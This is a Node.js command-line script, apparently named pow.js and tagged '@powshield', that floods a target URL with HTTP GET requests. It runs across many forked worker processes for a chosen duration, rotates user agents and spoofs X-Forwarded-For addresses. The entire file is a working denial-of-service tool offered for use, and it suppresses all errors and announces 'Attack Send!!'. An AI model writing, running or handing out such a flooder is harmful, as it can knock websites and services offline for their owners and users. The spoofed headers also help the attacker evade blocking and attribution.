const http = require('http');
const url = require('url');
const net = require('net');
const fs = require('fs');
const randstr = require('randomstring');
const cluster = require('cluster');

if (process.argv.length <= 4) {
  console.log('node pow.js <url> <connect 1 - 9999> <threads> <time> [@powshield]');
  process.exit(-1);
}

const target = process.argv[2];
const parsed = url.parse(target);
const host = parsed.host;
const rps = process.argv[3];
const threads = process.argv[4];
const time = process.argv[5];

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (error) {});
process.on('unhandledRejection', function (error) {});

let userAgents = [];
try {
  userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');
} catch (error) {
  console.error('You don\'t have UA. Go download ua.txt: ' + error);
  process.exit(-1);
}

if (cluster.isMaster) {
  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }
  
  console.log('Attack Send!! [@powshield]');
  setTimeout(() => {
    process.exit(1);
  }, time * 1000);
} else {
  startFlood();
}

function spoof() {
  return `${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}`;
}

function startFlood() {
  const interval = setInterval(() => {
    for (let i = 0; i < rps; i++) {
      const options = {
        host: host,
        path: parsed.path,
        method: 'GET',
        headers: {
          'Host': host,
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
          'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
          'Upgrade-Insecure-Requests': '1',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'en-US,en;q=0.9',
          'Cache-Control': 'max-age=0',
          'Connection': 'Keep-Alive',
          'X-Forwarded-For': spoof()
        },
      };

      const request = http.request(options);
      request.setHeader('GET', parsed.path + ' HTTP/1.1');
      request.setHeader('Host', host);
      request.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3');
      request.setHeader('User-Agent', userAgents[Math.floor(Math.random() * userAgents.length)]);
      request.setHeader('Upgrade-Insecure-Requests', '1');
      request.setHeader('Accept-Encoding', 'gzip, deflate');
      request.setHeader('Accept-Language', 'en-US,en;q=0.9');
      request.setHeader('Cache-Control', 'max-age=0');
      request.setHeader('Connection', 'Keep-Alive');
      request.setHeader('X-Forwarded-For', spoof());
      request.end();
    }
  });

  setTimeout(() => clearInterval(interval), time * 1000);
}
